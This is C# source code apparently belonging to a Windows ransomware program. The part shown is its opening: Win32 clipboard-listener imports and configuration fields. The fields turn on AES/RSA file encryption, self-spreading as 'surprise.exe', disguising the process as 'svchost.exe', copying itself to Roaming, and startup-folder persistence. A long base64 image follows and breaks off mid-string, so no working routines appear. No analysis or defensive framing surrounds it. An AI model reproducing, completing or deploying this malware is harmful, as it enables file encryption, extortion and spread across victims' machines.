using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "/9j/4AAQSkZJRgABAQEBLAEsAAD/4QBWRXhpZgAATU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAAITAAMAAAABAAEAAAAAAAAAAAEsAAAAAQAAASwAAAAB/+0ALFBob3Rvc2hvcCAzLjAAOEJJTQQEAAAAAAAPHAFaAAMbJUccAQAAAgAEAP/hDIFodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvADw/eHBhY2tldCBiZWdpbj0n77u/JyBpZD0nVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkJz8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0nYWRvYmU6bnM6bWV0YS8nIHg6eG1wdGs9J0ltYWdlOjpFeGlmVG9vbCAxMS44OCc+CjxyZGY6UkRGIHhtbG5zOnJkZj0naHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyc+CgogPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9JycKICB4bWxuczp0aWZmPSdodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyc+CiAgPHRpZmY6UmVzb2x1dGlvblVuaXQ+MjwvdGlmZjpSZXNvbHV0aW9uVW5pdD4KICA8dGlmZjpYUmVzb2x1dGlvbj4zMDAvMTwvdGlmZjpYUmVzb2x1dGlvbj4KICA8dGlmZjpZUmVzb2x1dGlvbj4zMDAvMTwvdGlmZjpZUmVzb2x1dGlvbj4KIDwvcmRmOkRlc2NyaXB0aW9uPgoKIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PScnCiAgeG1sbnM6eG1wTU09J2h0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8nPgogIDx4bXBNTTpEb2N1bWVudElEPnhtcC5paWQ6YWM0NmIwMWItOGNiMy00ZjQxLWFjMTctYmQwNzBlNDlkNjYyPC94bXBNTTpEb2N1bWVudElEPgogIDx4bXBNTTpJbnN0YW5jZUlEPmFkb2JlOmRvY2lkOnN0b2NrOjJmZGJmMDQwLWQ1MWMtNDgyZi05NjE0LWJhNWEyYTBkZjEwNDwveG1wTU06SW5zdGFuY2VJRD4KIDwvcmRmOkRlc2NyaXB0aW9uPgo8L3JkZjpSREY+CjwveDp4bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo8P3hwYWNrZXQgZW5kPSd3Jz8+/9sAQwAFAwQEBAMFBAQEBQUFBgcMCAcHBwcPCwsJDBEPEhIRDxERExYcFxMUGhURERghGBodHR8fHxMXIiQiHiQcHh8e/9sAQwEFBQUHBgcOCAgOHhQRFB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e/8AAEQgBaAIcAwERAAIRAQMRAf/EABsAAQADAQEBAQAAAAAAAAAAAAACAwQBBQYI/8QAPhAAAQQABAQEBAQFAwQCAwEAAQACAxEEEiExBRMiQRRRYYEycZGhI7HB8CRCUtHhFTPxBiVi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